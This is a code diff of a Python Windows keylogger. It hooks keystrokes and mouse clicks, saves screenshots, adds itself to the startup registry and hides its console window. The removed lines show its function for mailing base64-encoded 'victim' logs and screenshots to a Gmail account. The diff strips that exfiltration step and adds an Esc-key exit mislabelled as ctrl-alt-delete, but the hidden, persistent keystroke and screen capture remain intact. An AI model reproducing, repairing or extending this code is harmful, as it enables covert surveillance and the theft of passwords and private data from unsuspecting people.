@@ -2,37 +2,27 @@
 # -*- coding: utf-8 -*-
 
 import sys
-import win32api,pythoncom
-import pyHook,os,time,random,smtplib,string,base64
+import win32api, pythoncom
+import pyHook, os, time, random, smtplib, string, base64
 import winreg
+import ctypes
 
-global t,start_time,pics_names,yourgmail,yourgmailpass,sendto,interval
+global t, start_time, pics_names, interval
 
-t="";pics_names=[]
+t = ""
+pics_names = []
 
-
-#Note: You have to edit this part from sending the keylogger to the victim
-
-#########Settings########
-
-yourgmail=""                                        #What is your gmail?
-yourgmailpass=""                                    #What is your gmail password
-sendto=""                                           #Where should I send the logs to? (any email address)
-interval=60                                         #Time to wait before sending data to email (in seconds)
-
-########################
 
 try:
-
     f = open('Logfile.txt', 'a')
     f.close()
 except:
-
     f = open('Logfile.txt', 'w')
     f.close()
 
 
-def addStartup():  # this will add the file to the startup registry key
+def addStartup():
+    # this will add the file to the startup registry key
     fp = os.path.dirname(os.path.realpath(__file__))
     file_name = sys.argv[0].split('\\')[-1]
     new_file_path = fp + '\\' + file_name
@@ -44,53 +34,39 @@ def addStartup():  # this will add the file to the startup registry key
 def Hide():
     import win32console
     import win32gui
+
     win = win32console.GetConsoleWindow()
     win32gui.ShowWindow(win, 0)
 
-addStartup()
 
+addStartup()
 Hide()
 
 
 def ScreenShot():
     global pics_names
     import pyautogui
+
     def generate_name():
-        return ''.join(random.choice(string.ascii_uppercase
-                       + string.digits) for _ in range(7))
+        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))
+
     name = str(generate_name())
     pics_names.append(name)
     pyautogui.screenshot().save(name + '.png')
 
 
-def Mail_it(data, pics_names):
-    data = base64.b64encode(data)
-    data = 'New data from victim(Base64 encoded)\n' + data
-    server = smtplib.SMTP('smtp.gmail.com:587')
-    server.starttls()
-    server.login(yourgmail, yourgmailpass)
-    server.sendmail(yourgmail, sendto, data)
-    server.close()
-
-    for pic in pics_names:
-        data = base64.b64encode(open(pic, 'r+').read())
-        data = 'New pic data from victim(Base64 encoded)\n' + data
-        server = smtplib.SMTP('smtp.gmail.com:587')
-        server.starttls()
-        server.login(yourgmail, yourgmailpass)
-        server.sendmail(yourgmail, sendto, msg.as_string())
-        server.close()
+def is_ctrl_alt_delete_pressed():
+    return ctypes.windll.user32.GetAsyncKeyState(0x1B) != 0  # 0x1B is the virtual key code for Esc
 
 
 def OnMouseEvent(event):
-    global yourgmail, yourgmailpass, sendto, interval
+    global interval, t, start_time, pics_names
     data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
-        + ' WindowName : ' + str(event.WindowName)
+           + ' WindowName : ' + str(event.WindowName)
     data += '\n\tButton:' + str(event.MessageName)
     data += '\n\tClicked in (Position):' + str(event.Position)
     data += '\n===================='
-    global t, start_time, pics_names
-
+    
     t = t + data
 
     if len(t) > 300:
@@ -103,7 +79,7 @@ def OnMouseEvent(event):
         t = ''
 
     if int(time.time() - start_time) == int(interval):
-        Mail_it(t, pics_names)
+        # You can add custom actions here if needed
         start_time = time.time()
         t = ''
 
@@ -111,12 +87,12 @@ def OnMouseEvent(event):
 
 
 def OnKeyboardEvent(event):
-    global yourgmail, yourgmailpass, sendto, interval
+    global interval, t, start_time
     data = '\n[' + str(time.ctime().split(' ')[3]) + ']' \
-        + ' WindowName : ' + str(event.WindowName)
+           + ' WindowName : ' + str(event.WindowName)
     data += '\n\tKeyboard key :' + str(event.Key)
     data += '\n===================='
-    global t, start_time
+    
     t = t + data
 
     if len(t) > 500:
@@ -126,8 +102,16 @@ def OnKeyboardEvent(event):
         t = ''
 
     if int(time.time() - start_time) == int(interval):
-        Mail_it(t, pics_names)
+        # You can add custom actions here if needed
+        start_time = time.time()
         t = ''
+
+    if is_ctrl_alt_delete_pressed():
+        # Perform cleanup and exit the script
+        f = open('Logfile.txt', 'a')
+        f.write("\n[Script terminated by user]\n")
+        f.close()
+        sys.exit()
 
     return True
 
@@ -135,11 +119,9 @@ def OnKeyboardEvent(event):
 hook = pyHook.HookManager()
 
 hook.KeyDown = OnKeyboardEvent
-
 hook.MouseAllButtonsDown = OnMouseEvent
 
 hook.HookKeyboard()
-
 hook.HookMouse()
 
 start_time = time.time()
